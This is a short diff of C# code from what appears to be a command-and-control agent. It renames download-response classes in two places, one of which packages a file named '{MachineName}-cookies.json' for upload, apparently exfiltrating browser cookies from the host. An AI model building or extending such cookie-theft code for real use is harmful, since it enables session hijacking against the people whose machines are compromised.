@@ -54,10 +54,10 @@ namespace Agent
                 return;
             }
 
-            DownloadResponse dr = new DownloadResponse()
+            DownloadTaskResponse dr = new DownloadTaskResponse()
             {
                 task_id = response.task_id,
-                download = new DownloadResponseData
+                download = new DownloadTaskResponseData
                 {
                     total_chunks = 1,
                     is_screenshot = false,
@@ -415,9 +415,9 @@ namespace Agent
         } 
         private void StartSendFile(string task_id)
         {
-            messageManager.AddResponse(new DownloadResponse
+            messageManager.AddResponse(new DownloadTaskResponse
             {
-                download = new DownloadResponseData()
+                download = new DownloadTaskResponseData()
                 {
                     total_chunks = 1,
                     filename = $"{Environment.MachineName}-cookies.json",
